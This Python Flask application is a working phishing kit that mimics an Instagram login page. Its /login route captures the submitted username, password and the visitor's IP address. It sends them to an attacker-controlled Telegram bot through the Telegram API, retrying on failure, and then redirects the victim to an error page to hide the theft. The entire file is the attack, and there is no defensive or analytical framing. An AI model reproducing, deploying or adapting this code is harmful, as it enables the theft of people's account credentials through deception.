import os
import requests
from flask import Flask, request, render_template, redirect, url_for
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
CHAT_ID = os.getenv('CHAT_ID', 'YOUR_CHAT_ID_HERE')
TELEGRAM_API_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

def send_to_telegram(username, password, ip=None):
    if ip is None:
        ip = request.remote_addr if request else 'Unknown'
    message = f"🥀 New Instagram Login\n👤 Username: {username}\n🔑 Password: {password}\n🌐 IP: {ip}"
    for attempt in range(3):
        try:
            resp = requests.post(
                TELEGRAM_API_URL,
                data={'chat_id': CHAT_ID, 'text': message},
                timeout=10
            )
            if resp.status_code == 200:
                return True
            else:
                print(f"Telegram attempt {attempt+1} failed: {resp.text}")
        except Exception as e:
            print(f"Telegram attempt {attempt+1} exception: {e}")
    return False

@app.route('/', methods=['GET'])
def index():
    error = request.args.get('error')
    return render_template('index.html', error=error)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    if username and password:
        send_to_telegram(username, password)
    return redirect(url_for('index', error=1))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
